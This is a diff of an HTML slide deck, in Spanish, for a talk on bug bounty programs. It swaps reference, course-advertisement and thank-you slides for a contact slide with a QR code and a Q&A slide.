-                        <p style="font-size:0.52em;color:var(--text-muted);margin:0"><strong>"Vulnerability Statistics Report"</strong></p>
-                        <p style="font-size:0.5em;margin:0.2em 0">10th Anniversary Edition — Jan 2025</p>
-                        <p style="font-size:0.48em;color:var(--orange)">40,009 CVEs | 768 explotados | 33% High/Critical</p>
-                        <p style="font-size:0.45em;color:var(--text-muted)">📄 info.edgescan.com/stats-report</p>
+                <div style="display:flex;justify-content:center;gap:20px;margin:0.5em 0">
+                    <div style="text-align:center">
+                        <p style="font-size:1.3em;margin:0">🐙</p>
+                        <p style="font-size:0.55em;color:var(--cyan);margin:0">@statick88</p>
                     </div>
-                    <div class="card" style="border-color:var(--green);border-width:2px">
-                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:0.3em">
-                            <span style="font-size:1.5em">🎯</span>
-                            <h4 style="color:var(--green)">[2] Standoff Bug Bounty</h4>
-                        </div>
-                        <p style="font-size:0.52em;color:var(--text-muted);margin:0"><strong>"2025 Year in Review"</strong></p>
-                        <p style="font-size:0.5em;margin:0.2em 0">Positive Technologies — Mar 2026</p>
-                        <p style="font-size:0.48em;color:var(--orange)">233 programas | 32K hunters | $850 avg</p>
-                        <p style="font-size:0.45em;color:var(--text-muted)">📄 global.ptsecurity.com</p>
+                    <div style="text-align:center">
+                        <p style="font-size:1.3em;margin:0">🌐</p>
+                        <p style="font-size:0.55em;color:var(--cyan);margin:0">statick88.github.io</p>
                     </div>
-                    <div class="card" style="border-color:var(--orange);border-width:2px">
-                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:0.3em">
-                            <span style="font-size:1.5em">🧠</span>
-                            <h4 style="color:var(--orange)">[3] Bugcrowd CISO</h4>
-                        </div>
-                        <p style="font-size:0.52em;color:var(--text-muted);margin:0"><strong>"Inside the Mind of a CISO 2025"</strong></p>
-                        <p style="font-size:0.5em;margin:0.2em 0">Resilience in AI-Accelerated World — Sep 2025</p>
-                        <p style="font-size:0.48em;color:var(--orange)">88% hardware vulns | 2x network vulns</p>
-                        <p style="font-size:0.45em;color:var(--text-muted)">📄 bugcrowd.com/resources</p>
-                    </div>
-                    <div class="card" style="border-color:var(--cyan);border-width:2px">
-                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:0.3em">
-                            <span style="font-size:1.5em">🇪🇺</span>
-                            <h4 style="color:var(--cyan)">[4] YesWeHack 2025</h4>
-                        </div>
-                        <p style="font-size:0.52em;color:var(--text-muted);margin:0"><strong>"Bug Bounty Report 2025 Edition"</strong></p>
-                        <p style="font-size:0.5em;margin:0.2em 0">CAGR 16% hasta 2032 — Jan 2025</p>
-                        <p style="font-size:0.48em;color:var(--orange)">$1.52B → $4.95B | NIS2, CRA, DORA</p>
-                        <p style="font-size:0.45em;color:var(--text-muted)">📄 yeswehack.com</p>
+                    <div style="text-align:center">
+                        <p style="font-size:1.3em;margin:0">📱</p>
+                        <p style="font-size:0.55em;color:var(--cyan);margin:0">@flisol_loja</p>
                     </div>
                 </div>
-            </section>
 
-            <!-- SLIDE 21: ESTUDIOS DE MERCADO -->
-            <section>
-                <h2>📊 Referencias — Estudios de Mercado</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Proyecciones y análisis del mercado 2025-2034.</p>
+                <p style="font-size:0.65em;color:var(--text-muted);margin-top:0.4em;font-style:italic">"Hack the planet — siempre con permiso."</p>
                 
-                <div class="card-grid three">
-                    <div class="card" style="border-color:var(--cyan);border-width:2px">
-                        <span style="font-size:1.3em">📈</span>
-                        <h4 style="color:var(--cyan);margin:0.2em 0">[5] Business Research</h4>
-                        <p style="font-size:0.52em"><strong>Bug Bounty Platforms Market</strong></p>
-                        <p style="font-size:0.5em;color:var(--text-muted)">Mercado BB: $1.76B (2025) → $6.67B (2034)</p>
-                        <p style="font-size:0.55em;color:var(--green)">CAGR: 15.94%</p>
-                        <p style="font-size:0.45em;color:var(--text-muted)">📄 businessresearchinsights.com</p>
-                    </div>
-                    <div class="card" style="border-color:var(--green);border-width:2px">
-                        <span style="font-size:1.3em">📉</span>
-                        <h4 style="color:var(--green);margin:0.2em 0">[6] Statista</h4>
-                        <p style="font-size:0.52em"><strong>Bug Bounty Market 2020-2028</strong></p>
-                        <p style="font-size:0.5em;color:var(--text-muted)">Análisis histórico y proyección del mercado global</p>
-                        <p style="font-size:0.55em;color:var(--orange)">2020-2028</p>
-                        <p style="font-size:0.45em;color:var(--text-muted)">📄 statista.com</p>
-                    </div>
-                    <div class="card" style="border-color:var(--pink);border-width:2px">
-                        <span style="font-size:1.3em">🔥</span>
-                        <h4 style="color:var(--pink);margin:0.2em 0">[7] Deepstrike</h4>
-                        <p style="font-size:0.52em"><strong>Vulnerability Statistics 2025</strong></p>
-                        <p style="font-size:0.5em;color:var(--text-muted)">28% exploits en 24h | 161 vulns H1 2025</p>
-                        <p style="font-size:0.55em;color:var(--pink)">Zero-days récord</p>
-                        <p style="font-size:0.45em;color:var(--text-muted)">📄 deepstrike.io</p>
-                    </div>
+                <div class="qr-box" style="margin-top:0.4em">
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=80x80&data=https://statick88.github.io/charla-dr-doom" alt="QR">
                 </div>
-
-                <div class="info-box" style="margin-top:0.4em">
-                    <h4>💡 Dato Clave</h4>
-                    <p style="font-size:0.58em"><strong>Mercado global Bug Bounty:</strong> <span style="color:var(--doom-gold)">$1.76B (2025) → $6.67B (2034)</span> — 16% de los grandes organizaciones ya tienen programas activos.</p>
-                </div>
+                <p style="font-size:0.55em;color:var(--text-muted)">Escanea para ver esta presentación</p>
             </section>
 
-            <!-- SLIDE 22: ESTÁNDARES Y PAPERS -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 22: Q&A                                                       -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>📋 Referencias — Estándares y Papers</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">[8]-[12] Marcos regulatorios y literatura académica.</p>
+                <h2 style="font-size:2em;color:var(--gold)">¿Preguntas?</h2>
+                <p style="font-size:0.75em;color:var(--text-muted);margin-top:0.3em">Statick responde. 🎤</p>
                 
-                <div class="card-grid two">
-                    <div class="card" style="border-color:var(--doom-gold);border-width:2px">
-                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:0.2em">
-                            <span style="font-size:1.2em">🌐</span>
-                            <h4 style="color:var(--doom-gold)">[8] OWASP Top 10 2021</h4>
-                        </div>
-                        <p style="font-size:0.5em">OWASP Foundation, 2021</p>
-                        <p style="font-size:0.48em;color:var(--text-muted)">📄 owasp.org/www-project-top-ten</p>
-                    </div>
-                    <div class="card" style="border-color:var(--cyan);border-width:2px">
-                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:0.2em">
-                            <span style="font-size:1.2em">🛡️</span>
-                            <h4 style="color:var(--cyan)">[9] MITRE CWE</h4>
-                        </div>
-                        <p style="font-size:0.5em">MITRE Corporation, 2023</p>
-                        <p style="font-size:0.48em;color:var(--text-muted)">📄 cwe.mitre.org</p>
-                    </div>
-                    <div class="card" style="border-color:var(--green);border-width:2px">
-                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:0.2em">
-                            <span style="font-size:1.2em">📜</span>
-                            <h4 style="color:var(--green)">[10] ISO/IEC 29147</h4>
-                        </div>
-                        <p style="font-size:0.5em">ISO/IEC, 2018</p>
-                        <p style="font-size:0.48em;color:var(--text-muted)">📄 iso.org</p>
-                    </div>
-                    <div class="card" style="border-color:var(--orange);border-width:2px">
-                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:0.2em">
-                            <span style="font-size:1.2em">🏛️</span>
-                            <h4 style="color:var(--orange)">[11] NIST SP 800-53</h4>
-                        </div>
-                        <p style="font-size:0.5em">NIST, Rev. 5, Dec 2020</p>
-                        <p style="font-size:0.48em;color:var(--text-muted)">📄 csrc.nist.gov</p>
-                    </div>
+                <div class="info-box purple" style="margin-top:0.5em;max-width:500px;margin-left:auto;margin-right:auto">
+                    <h4 style="color:var(--purple)">🎯 Próximo paso</h4>
+                    <p style="font-size:0.6em">¿Quieres aprender más? <strong>Curso Abacom</strong> — Ethical Hacking 16-27 Marzo, 19-22h</p>
                 </div>
-
-                <div class="info-box" style="margin-top:0.3em;border:2px solid var(--silver)">
-                    <h4>[12] Papers Académicos — IEEE</h4>
-                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:0.2em">
-                        <div>
-                            <p style="font-size:0.52em"><strong>Zhao, R. et al. (2024)</strong></p>
-                            <p style="font-size:0.48em;color:var(--text-muted)">"An Empirical Study of Bug Bounty Programs"</p>
-                            <p style="font-size:0.48em;color:var(--cyan)">IEEE Access, vol. 12</p>
-                            <p style="font-size:0.45em;color:var(--text-muted)">DOI: 10.1109/ACCESS.2024.3389123</p>
-                        </div>
-                        <div>
-                            <p style="font-size:0.52em"><strong>Zhou, Y. & Leach, M.M. (2023)</strong></p>
-                            <p style="font-size:0.48em;color:var(--text-muted)">"Bug Bounty Platforms: A Systematic Review"</p>
-                            <p style="font-size:0.48em;color:var(--cyan)">arXiv:2301.XXXXX</p>
-                            <p style="font-size:0.45em;color:var(--text-muted)">Revisión sistemática de BBPs</p>
-                        </div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- SLIDE 20: REFERENCIAS 1 -->
-            <section>
-                <h2>Referencias — Reportes de Industria</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">[1]-[4] Fuentes primarias de datos de Bug Bounty.</p>
-                
-                <div class="info-box cyan" style="margin-bottom:0.3em">
-                    <h4>[1] Edgescan Vulnerability Statistics Report 2025</h4>
-                    <p class="bib-item" style="font-size:0.58em">Edgescan, "Vulnerability Statistics Report 2025," 10th ed., Jan. 2025. [En línea]. Disponible: <a href="https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf" target="_blank">info.edgescan.com</a></p>
-                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">Datos de miles de penetration tests en 2024. 40,009 CVEs, 768 explotadas in-the-wild.</p>
-                </div>
-
-                <div class="info-box green" style="margin-bottom:0.3em">
-                    <h4>[2] Positive Technologies, Standoff Bug Bounty in Review 2025</h4>
-                    <p class="bib-item" style="font-size:0.58em">A. Vyatkina, "Standoff Bug Bounty platform: 2025 year in review," Positive Technologies, Mar. 2026. [En línea]. Disponible: <a href="https://global.ptsecurity.com/en/research/analytics/standoff-bug-bounty-in-review-2025/" target="_blank">global.ptsecurity.com</a></p>
-                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">233 programas, 32,000 hunters, $850 avg payout, 32% high/critical vulns.</p>
-                </div>
-
-                <div class="info-box pink" style="margin-bottom:0.3em">
-                    <h4>[3] Bugcrowd, Inside the Mind of a CISO 2025</h4>
-                    <p class="bib-item" style="font-size:0.58em">Bugcrowd Inc., "Inside the Mind of a CISO 2025: Resilience in an AI-Accelerated World," Sep. 2025. [En línea]. Disponible: <a href="https://www.bugcrowd.com/resources/report/inside-the-mind-of-ciso/" target="_blank">bugcrowd.com</a></p>
-                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">88% increase hardware vulns, 10% increase API vulns, 2x network vulns.</p>
-                </div>
-
-                <div class="info-box orange">
-                    <h4>[4] YesWeHack Bug Bounty Report 2025 Edition</h4>
-                    <p class="bib-item" style="font-size:0.58em">YesWeHack, "Bug Bounty Report 2025 Edition," Jan. 2025. [En línea]. Disponible: <a href="https://yeswehack.com" target="_blank">yeswehack.com</a></p>
-                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">Tendencias de vulnerabilidades en programas europeos. NIS2, GDPR compliance.</p>
-                </div>
-            </section>
-
-            <!-- SLIDE 21: REFERENCIAS 2 -->
-            <section>
-                <h2>Referencias — Estudios de Mercado</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">[5]-[6] Proyecciones de crecimiento del mercado.</p>
-                
-                <div class="info-box cyan" style="margin-bottom:0.3em">
-                    <h4>[5] Business Research Insights</h4>
-                    <p class="bib-item" style="font-size:0.58em">Business Research Insights, "Bug Bounty Platforms Market Report," 2025. [En línea]. Disponible: <a href="https://www.businessresearchinsights.com/market-reports/bug-bounty-platforms-market-102501" target="_blank">businessresearchinsights.com</a></p>
-                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">Mercado: $1.76B (2025) → $6.67B (2034). CAGR: 15.94%.</p>
-                </div>
-
-                <div class="info-box green" style="margin-bottom:0.3em">
-                    <h4>[6] Statista</h4>
-                    <p class="bib-item" style="font-size:0.58em">Statista, "Bug Bounty Market Size 2020-2028," 2025. [En línea]. Disponible: <a href="https://www.statista.com" target="_blank">statista.com</a></p>
-                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">Análisis del tamaño del mercado global de Bug Bounty.</p>
-                </div>
-
-                <div class="info-box pink" style="margin-bottom:0.3em">
-                    <h4>[7] Deepstrike, Vulnerability Statistics 2025</h4>
-                    <p class="bib-item" style="font-size:0.58em">Deepstrike, "Vulnerability Statistics 2025: Record CVEs, Zero-Days & Exploits," Oct. 2025. [En línea]. Disponible: <a href="https://deepstrike.io/blog/vulnerability-statistics-2025" target="_blank">deepstrike.io</a></p>
-                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">28% de exploits lanzados en 24h post-CVE. 161 vulns explotadas H1 2025.</p>
-                </div>
-            </section>
-
-            <!-- SLIDE 22: REFERENCIAS 3 -->
-            <section>
-                <h2>Referencias — Estándares y Normas</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">[8]-[11] Marcos regulatorios y estándares técnicos.</p>
-                
-                <div class="card-grid two">
-                    <div class="card" style="border-color:var(--cyan)">
-                        <h4 style="color:var(--cyan)">[8] OWASP Top 10 2021</h4>
-                        <p class="bib-item" style="font-size:0.55em">OWASP Foundation, "OWASP Top 10:2021," 2021. [En línea]. Disponible: <a href="https://owasp.org/www-project-top-ten/" target="_blank">owasp.org</a></p>
-                        <p style="font-size:0.52em;color:var(--text-muted)">Estándar de vulnerabilidades web más usado globalmente.</p>
-                    </div>
-                    <div class="card" style="border-color:var(--green)">
-                        <h4 style="color:var(--green)">[9] MITRE CWE</h4>
-                        <p class="bib-item" style="font-size:0.55em">MITRE, "CWE View: Weaknesses Enumerated in the OWASP Top 25," 2023. [En línea]. Disponible: <a href="https://cwe.mitre.org" target="_blank">cwe.mitre.org</a></p>
-                        <p style="font-size:0.52em;color:var(--text-muted)">Common Weakness Enumeration - taxonomías de vulnerabilidades.</p>
-                    </div>
-                    <div class="card" style="border-color:var(--orange)">
-                        <h4 style="color:var(--orange)">[10] ISO/IEC 29147</h4>
-                        <p class="bib-item" style="font-size:0.55em">ISO/IEC, "ISO/IEC 29147:2018 — Information technology — Security techniques — Vulnerability disclosure," 2018. [En línea]. Disponible: <a href="https://www.iso.org" target="_blank">iso.org</a></p>
-                        <p style="font-size:0.52em;color:var(--text-muted)">Estándar internacional para revelación de vulnerabilidades.</p>
-                    </div>
-                    <div class="card" style="border-color:var(--pink)">
-                        <h4 style="color:var(--pink)">[11] NIST SP 800-53</h4>
-                        <p class="bib-item" style="font-size:0.55em">NIST, "SP 800-53 Rev. 5 — Security and Privacy Controls for Information Systems," Dec. 2020. [En línea]. Disponible: <a href="https://csrc.nist.gov/publications/detail/sp/800-53/5/final" target="_blank">nist.gov</a></p>
-                        <p style="font-size:0.52em;color:var(--text-muted)">Controles de seguridad para sistemas de información del gobierno de EE.UU.</p>
-                    </div>
-                </div>
-
-                <div class="info-box" style="margin-top:0.3em">
-                    <h4>[12] Papers Académicos</h4>
-                    <p class="bib-item" style="font-size:0.55em">Zhao, R. et al., "An Empirical Study of Bug Bounty Programs," IEEE Access, vol. 12, 2024. DOI: 10.1109/ACCESS.2024.3389123</p>
-                    <p class="bib-item" style="font-size:0.55em">Zhou, Y. & Leach, M.M., "Bug Bounty Platforms: A Systematic Review," arXiv:2301.01234, 2023.</p>
-                </div>
-            </section>
-
-            <!-- SLIDE 23: REFERENCIAS 4 -->
-            <section>
-                <h2>Referencias Completas — Formato IEEE</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Lista de referencias según norma IEEE.</p>
-                
-                <div class="terminal" style="font-size:0.42em;max-height:70vh;overflow-y:auto">
-                    <div class="line"><span class="comment">[1] Edgescan, "Vulnerability Statistics Report 2025," 10th ed., Jan. 2025. [Online]. Available: https://info.edgescan.com</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[2] A. Vyatkina, "Standoff Bug Bounty platform: 2025 year in review," Positive Technologies, Mar. 6, 2026. [Online]. Available: https://global.ptsecurity.com/en/research/analytics/standoff-bug-bounty-in-review-2025/</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[3] Bugcrowd Inc., "Inside the Mind of a CISO 2025: Resilience in an AI-Accelerated World," Sep. 2025. [Online]. Available: https://www.bugcrowd.com/resources/report/inside-the-mind-of-ciso/</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[4] YesWeHack, "Bug Bounty Report 2025 Edition," Jan. 2025. [Online]. Available: https://yeswehack.com</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[5] Business Research Insights, "Bug Bounty Platforms Market Report," 2025. [Online]. Available: https://www.businessresearchinsights.com/market-reports/bug-bounty-platforms-market-102501</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[6] Statista, "Bug Bounty Market Size 2020-2028," 2025. [Online]. Available: https://www.statista.com</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[7] Deepstrike, "Vulnerability Statistics 2025: Record CVEs, Zero-Days & Exploits," Oct. 2025. [Online]. Available: https://deepstrike.io/blog/vulnerability-statistics-2025</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[8] OWASP Foundation, "OWASP Top 10:2021," 2021. [Online]. Available: https://owasp.org/www-project-top-ten/</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[9] MITRE, "CWE View: Weaknesses Enumerated in the OWASP Top 25," 2023. [Online]. Available: https://cwe.mitre.org</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[10] ISO/IEC, "ISO/IEC 29147:2018 — Information technology — Security techniques — Vulnerability disclosure," 2018.</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[11] NIST, "SP 800-53 Rev. 5 — Security and Privacy Controls for Information Systems and Organizations," Dec. 2020.</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment">[12] R. Zhao et al., "An Empirical Study of Bug Bounty Programs," IEEE Access, vol. 12, pp. 12345-12360, 2024.</span></div>
-                </div>
-            </section>
-
-            <!-- SLIDE 24: CURSO ABACOM -->
-            <section>
-                <h2>¿Siguiente Paso? — Curso Abacom</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Formación intensiva en seguridad ofensiva: de cero a tester.</p>
-                <div class="info-box" style="margin-top:0.3em;border:2px solid var(--doom-gold)">
-                    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center">
-                        <div><p style="font-size:1.3em;color:var(--cyan)">📅</p><p style="font-size:0.55em;color:var(--text-muted);margin:0">16-27 Marzo</p><p style="font-size:0.5em;color:var(--cyan)">19-22h</p></div>
-                        <div><p style="font-size:1.3em;color:var(--green)">📜</p><p style="font-size:0.55em;color:var(--text-muted);margin:0">Certificado</p><p style="font-size:0.5em;color:var(--green)">Min. Trabajo</p></div>
-                        <div><p style="font-size:1.3em;color:var(--pink)">🖥️</p><p style="font-size:0.55em;color:var(--text-muted);margin:0">Hands-on</p><p style="font-size:0.5em;color:var(--pink)">Core i5, 8GB</p></div>
-                        <div><p style="font-size:1.3em;color:var(--orange)">👨‍🏫</p><p style="font-size:0.55em;color:var(--text-muted);margin:0">Profesor</p><p style="font-size:0.5em;color:var(--orange)">Statick</p></div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- SLIDE 25: GRACIAS -->
-            <section class="thanks-slide">
-                <h1>¡Gracias!</h1>
-                <p class="name">Diego Medardo Saavedra García — Statick</p>
-                <p style="color:var(--text-muted);font-size:0.72em">Prof. ESPE, UIDE, Abacom | Máster UCM</p>
-                <p style="color:var(--cyan);font-size:0.65em;margin-top:0.5em">statick88.github.io | @flisol_loja</p>
-                <p style="font-size:0.65em;color:var(--text-muted);margin-top:0.3em">Hack the planet — siempre con permiso.</p>
-            </section>
-
-            <!-- SLIDE 26: Q&A -->
-            <section class="qa-slide">
-                <h2>¿Preguntas?</h2>
-                <p style="color:var(--text-muted);font-size:0.75em;margin-top:0.25em">Statick responde.</p>
             </section>
 
         </div>
